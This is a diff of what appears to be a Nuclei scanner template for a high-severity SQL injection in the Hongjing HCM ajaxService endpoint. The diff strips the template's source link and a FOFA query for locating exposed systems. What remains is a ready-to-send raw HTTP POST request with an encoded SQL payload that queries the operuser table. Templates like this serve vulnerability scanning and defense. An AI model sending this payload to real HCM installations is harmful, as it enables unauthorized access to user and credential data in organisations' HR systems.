@@ -3,12 +3,8 @@ info:
   name: 宏景HCM-SQL注入-ajaxService
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gigxxxgawn136giz'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gigxxxgawn136giz
-    fofa: icon_hash="947874108" || body='<div class="hj-hy-all-one-logo"' || app="HJSOFT-HCM"
 http:
 - raw:
   - 'POST /ajax/ajaxService HTTP/1.1
@@ -18,8 +14,6 @@ http:
 
 
     Content-Type: application/x-www-form-urlencoded
-
-
 
 
     __type=extTrans&__xml={"functionId":"151211001137","sql":"select~20111*111~20a~30~31~30~30~2c~31~20a~30~31~30~31~2c~31~20b~30~31~31~30~2c~31~20e~30~31~32~32~2c~31~20e~30~31a~31~2c~31~20dbase~2c~31~20a~30~30~30~30~20from~20operuser","nbase":"1"}
